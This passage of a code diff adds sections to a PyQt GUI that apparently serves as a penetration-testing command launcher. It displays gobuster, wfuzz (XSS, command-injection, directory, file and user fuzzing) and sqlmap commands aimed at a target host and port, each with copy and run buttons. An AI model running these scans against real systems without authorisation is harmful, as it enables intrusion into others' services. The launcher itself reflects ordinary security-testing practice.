+        gobusterFile_Scan1 = QtWidgets.QLabel(f"gobuster dir -u http://{rhost}:{rport} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -l -k -t 30")
+        gobusterFile_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(gobusterFile_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(gobusterFile_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(gobusterFile_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command13 = gobusterFile_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command13]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(gobusterFile_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+############################################################################## 
+        gobusterSub = QtWidgets.QLabel("[+ Gobuster for SubDomain Brute Forcing]")
+        gobusterSub.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(gobusterSub)
+##############################################################################        
+        gobusterSub_Scan1 = QtWidgets.QLabel(f"gobuster dns -d domain.org -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30")
+        gobusterSub_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(gobusterSub_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(gobusterSub_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(gobusterSub_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command14 = gobusterSub_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command14]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(gobusterSub_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        wfuzzXSS = QtWidgets.QLabel("[+ Wfuzz XXS Fuzzing]")
+        wfuzzXSS.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(wfuzzXSS)
+##############################################################################        
+        wfuzzXSS_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt http://{rhost}:{rport}/FUZZ")
+        wfuzzXSS_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzXSS_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzXSS_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzXSS_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command15 = wfuzzXSS_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command15]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzXSS_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        wfuzzXSS_Scan2 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt http://10.11.1.71:80/FUZZ")
+        wfuzzXSS_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzXSS_Scan2)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzXSS_Scan2.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzXSS_Scan2)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command16 = wfuzzXSS_Scan2.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command16]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzXSS_Scan2)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        wfuzzCIPD = QtWidgets.QLabel("[+ Wfuzz Command Injection with Post Data]")
+        wfuzzCIPD.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(wfuzzCIPD)
+##############################################################################        
+        wfuzzCIPD_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/command-injection-commix.txt -d doi=FUZZ http://{rhost}:{rport}/FUZZ")
+        wfuzzCIPD_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzCIPD_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzCIPD_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzCIPD_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command17 = wfuzzCIPD_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command17]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzCIPD_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+############################################################################## 
+        wfuzzPE = QtWidgets.QLabel("[+ Wfuzz Testing for Parameter Existence]")
+        wfuzzPE.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(wfuzzPE)
+##############################################################################        
+        wfuzzPE_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://{rhost}:{rport}/FUZZ")
+        wfuzzPE_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzPE_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzPE_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzPE_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command18 = wfuzzPE_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command18]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzPE_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+############################################################################## 
+        wfuzzAFD = QtWidgets.QLabel("[+ Wfuzz Authenticated Fuzzing Directories")
+        wfuzzAFD.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(wfuzzAFD)
+##############################################################################        
+        wfuzzAFD_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -hc 404 -d \"SESSIONID=value\" \"http://{rhost}:{rport}/FUZZ/\"")
+        wfuzzAFD_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzAFD_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzAFD_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzAFD_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################       
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command19 = wfuzzAFD_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command19]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzAFD_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+############################################################################## 
+        wfuzzAFF = QtWidgets.QLabel("[+ Authenticated File Fuzzing]")
+        wfuzzAFF.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(wfuzzAFF)
+##############################################################################        
+        wfuzzAFF_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -hc 404 -d \"SESSIONID=value\" \"http://{rhost}:{rport}/FUZZ\"")
+        wfuzzAFF_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzAFF_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzAFF_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzAFF_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################       
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command20 = wfuzzAFF_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command20]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzAFF_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+############################################################################## 
+        wfuzzD = QtWidgets.QLabel("[+ Wfuzz Fuzz Directories]")
+        wfuzzD.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(wfuzzD)
+##############################################################################        
+        wfuzzD_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 \"http://{rhost}:{rport}/FUZZ/\"")
+        wfuzzD_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzD_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzD_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzD_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################       
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command21 = wfuzzD_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command21]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzD_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        wfuzzD_Scan2 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hh 0 \"http://{rhost}:{rport}/FUZZ/\"")
+        wfuzzD_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzD_Scan2)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzD_Scan2.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzD_Scan2)
+        self.container_layout.addLayout(label_layout)
+##############################################################################  
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command22 = wfuzzD_Scan2.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command22]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzD_Scan2)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        wfuzzD_Scan3 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 \"http://{rhost}:{rport}/FUZZ/\"")
+        wfuzzD_Scan3.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzD_Scan3)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzD_Scan3.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzD_Scan3)
+        self.container_layout.addLayout(label_layout)
+##############################################################################  
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command23 = wfuzzD_Scan3.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command23]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzD_Scan3)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        wfuzzD_Scan4 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 --hh 0 \"http://{rhost}:{rport}/FUZZ/\"")
+        wfuzzD_Scan4.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzD_Scan4)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzD_Scan4.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzD_Scan4)
+        self.container_layout.addLayout(label_layout)
+##############################################################################  
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command24 = wfuzzD_Scan4.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command24]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzD_Scan4)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################       
+        wfuzzF = QtWidgets.QLabel("[+ Wfuzz Fuzz Files]")
+        wfuzzF.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(wfuzzF)
+##############################################################################        
+        wfuzzF_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 \"http://{rhost}:{rport}/FUZZ\"")
+        wfuzzF_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzF_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzF_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzF_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################       
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command25 = wfuzzF_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command25]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzF_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        wfuzzF_Scan2 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 --hh 0 \"http://{rhost}:{rport}/FUZZ\"")
+        wfuzzF_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzF_Scan2)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzF_Scan2.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzF_Scan2)
+        self.container_layout.addLayout(label_layout)
+##############################################################################  
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command26 = wfuzzF_Scan2.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command26]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzF_Scan2)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        wfuzzF_Scan3 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 \"http://{rhost}:{rport}/FUZZ\"")
+        wfuzzF_Scan3.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzF_Scan3)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzF_Scan3.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzF_Scan3)
+
+        self.container_layout.addLayout(label_layout)
+##############################################################################  
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command27 = wfuzzF_Scan3.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command27]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzF_Scan3)
+
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        wfuzzF_Scan4 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 --hh 0 \"http://{rhost}:{rport}/FUZZ\"")
+        wfuzzF_Scan4.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzF_Scan4)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzF_Scan4.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wfuzzF_Scan4)
+
+        self.container_layout.addLayout(label_layout)
+##############################################################################  
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command28 = wfuzzF_Scan4.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command28]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzF_Scan4)
+
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################       
+        wfuzzUsers = QtWidgets.QLabel("[+ Wfuzz Users]")
+        wfuzzUsers.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(wfuzzUsers)
+##############################################################################        
+        wfuzzUsers_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt --hc 404,403  \"http://{rhost}:{rport}/FUZZ\"")
+        wfuzzUsers_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wfuzzUsers_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzUsers_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        self.container_layout.addLayout(label_layout)
+##############################################################################     
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command29 = wfuzzUsers_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command29]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wfuzzUsers_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        SQLMap = QtWidgets.QLabel("[+ SQLMap]")
+        SQLMap.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+        self.container_layout.addWidget(SQLMap)
+##############################################################################
+        SQLMap_Scan1 = QtWidgets.QLabel(f"sqlmap -u http://{rhost}:{rport} --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl")
+        SQLMap_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(SQLMap_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(SQLMap_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
